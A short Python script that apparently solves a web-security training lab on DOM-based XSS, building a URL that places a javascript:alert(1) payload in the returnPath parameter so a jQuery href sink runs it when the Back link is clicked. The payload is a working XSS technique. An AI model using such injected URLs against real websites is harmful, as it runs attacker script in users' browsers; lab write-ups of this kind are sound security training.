import argparse
import requests

# DOM XSS in a jQuery anchor href sink using source location.search. jQuery reads
# the returnPath query parameter and assigns it to a "Back" link's href via
# .attr("href", ...). An href accepts javascript: URLs, so returnPath=javascript:
# alert(1) makes the link execute JS when clicked.
#
# DOM-based AND click-triggered: the payload executes in the browser only after
# the user clicks the Back link, so Python can't fire it. The script prints the
# exploit URL (load it, then click Back) and checks the lab status.

parser = argparse.ArgumentParser(description="Solve XSS lab 5 (DOM XSS, jQuery href sink, location.search source)")
parser.add_argument("lab_url", help="Lab URL (https://0a...web-security-academy.net)")
parser.add_argument("--payload", default="javascript:alert(1)",
                    help="javascript: URL placed in the returnPath parameter")
args = parser.parse_args()

lab_url = args.lab_url.rstrip("/")

# the payload rides in returnPath; jQuery reads it client-side from location.search
# and sets it as the Back link's href.
exploit_url = f"{lab_url}/feedback?returnPath={requests.utils.quote(args.payload, safe=':')}"

print("[*] This is DOM-based XSS in an href sink - it fires when the Back link is CLICKED.")
print("[*] Open this URL in a browser, then click the 'Back' link:")
print(f"    {exploit_url}")

if "is-solved" in requests.get(lab_url + "/").text:
    print("[+] Lab solved!")
else:
    print("[!] Not marked solved yet - load the URL above and click Back.")
